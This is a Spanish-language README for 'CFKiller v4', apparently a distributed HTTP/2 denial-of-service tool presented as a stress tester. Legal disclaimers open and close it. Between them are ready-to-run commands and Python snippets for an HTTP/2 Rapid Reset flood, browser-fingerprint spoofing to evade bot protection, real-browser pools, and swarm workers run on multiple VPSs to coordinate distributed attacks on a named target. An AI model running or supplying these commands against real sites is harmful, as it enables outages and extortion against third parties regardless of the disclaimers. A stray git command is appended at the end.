# CFKiller v4 - Framework de Stress Testing HTTP/2

⚠️ ADVERTENCIA LEGAL – USO RESTRINGIDO ⚠️

Esta herramienta es exclusivamente para:
- Pentesting autorizado con Rules of Engagement (RoE) firmado
- Hardening y stress testing de infraestructura propia
- Investigación y educación en entornos controlados

Cualquier uso no autorizado (DDoS, extorsión, ataque a terceros sin permiso) es delito penal en prácticamente todos los países. El autor no se hace responsable por mal uso.

---

## Instalación

1. Instala Python 3.11 o superior.
2. Clona el repositorio y entra a la carpeta del proyecto.
3. Instala las dependencias:
   
   **Con Poetry (recomendado):**
   ```powershell
   pip install poetry
   poetry install
   ```
   **O con pip:**
   ```powershell
   pip install -r requirements.txt
   ```

---

## Cómo lanzar un ataque a un objetivo específico (ejemplos)

### 1) Rapid Reset (HTTP/2) – CLI
```powershell
python main.py rapid example.com -t 20 -c 10 -i 200
```
Parámetros:
- `-t/--time`: duración en segundos (ej. 20)
- `-c/--conn`: conexiones simultáneas (ej. 10)
- `-i/--intensity`: streams por conexión antes del RST

### 2) Rapid Reset – línea directa (one-liner)
```powershell
python -c "import asyncio; from cfkiller.core.http2.rapid_reset import RapidResetAttacker; attacker = RapidResetAttacker(host='example.com', duration=30, max_connections=20, intensity=500); asyncio.run(attacker.attack())"
```

### 3) uTLS spoof (peticiones con firma de navegador)
```powershell
python main.py spoof https://example.com -n 500 -c 100
```

### 4) Browser pool (navegadores reales)
```powershell
python main.py browser https://example.com -b 50 -t 120
```

### 5) Swarm worker (ejecutar en cada VPS para coordinar ataques distribuidos)
```powershell
python -m cfkiller.core.swarm.worker example.com
```
o
```powershell
python cfkiller/core/swarm/worker.py example.com
```

---

## Configuración y variables de entorno

El archivo `cfkiller/config/settings.py` contiene valores por defecto. Además puedes usar un archivo `.env` con variables como:

```
TARGET=https://example.com
DURATION=30
CONNECTIONS=10
INTENSITY=200
```

Ejemplo PowerShell:
```powershell
$env:TARGET = 'https://example.com'
$env:DURATION = '30'
python main.py rapid $env:TARGET -t $env:DURATION -c $env:CONNECTIONS -i $env:INTENSITY
```

---

## API y compatibilidad
- `RapidResetAttacker(host, duration, max_connections, intensity)` es la API base en Python.
- También acepta `connections` como alias para `max_connections` si prefieres usar ese nombre.
- `RapidResetAttacker` expone `get_stats()` que devuelve un dict con `sent`, `reset`, `errors`, `start_time`, `rps`.

---

## Tests
```powershell
pytest
```
o con Poetry:
```powershell
poetry run pytest
```

---

## Ejemplos de uso en script (Python)

```python
import asyncio
from cfkiller.core.http2.rapid_reset import RapidResetAttacker

attacker = RapidResetAttacker(
    host='example.com',
    duration=30,
    max_connections=20,
    intensity=500
)
asyncio.run(attacker.attack())
```

---

## Buenas prácticas y notas legales
- Solo ejecutar pruebas con autorización explícita.
- Usa entornos de ensayo para evitar afectar servicios productivos.
- Revisa límites y permisos de red (firewall, proxies, etc.).

---

## Soporte y mejoras
Abre un issue en el repositorio para bugs o feature requests.
⚠️ ADVERTENCIA LEGAL – USO RESTRINGIDO ⚠️

Esta herramienta es exclusivamente para:
- Pentesting autorizado con Rules of Engagement (RoE) firmado
- Hardening y stress testing de infraestructura propia
- Investigación y educación en entornos controlados

Cualquier uso no autorizado (DDoS, extorsión, ataque a terceros sin permiso) es delito penal en prácticamente todos los países (CFAA, leyes de delitos informáticos, etc.).

El autor no se hace responsable por mal uso.git pull origin main --rebase